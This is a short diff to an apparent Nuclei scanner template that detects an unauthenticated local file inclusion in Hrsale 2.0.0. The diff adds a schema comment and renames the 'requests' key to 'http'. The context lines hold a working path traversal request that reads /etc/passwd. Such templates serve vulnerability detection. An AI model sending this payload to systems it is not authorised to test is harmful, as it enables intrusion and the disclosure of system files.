@@ -1,3 +1,4 @@
+# yaml-language-server: $schema=https://raw.githubusercontent.com/projectdiscovery/nuclei/dev/pkg/templates/nuclei-jsonschema.json
 id: hrsale-unauthenticated-lfi
 info:
   name: Hrsale 2.0.0 - Local File Inclusion
@@ -11,7 +12,7 @@ info:
     cvss-score: 7.5
     cwe-id: CWE-22
   tags: hrsale,lfi
-requests:
+http:
   - method: GET
     path:
       - "{{BaseURL}}/download?type=files&filename=../../../../../../../../etc/passwd"
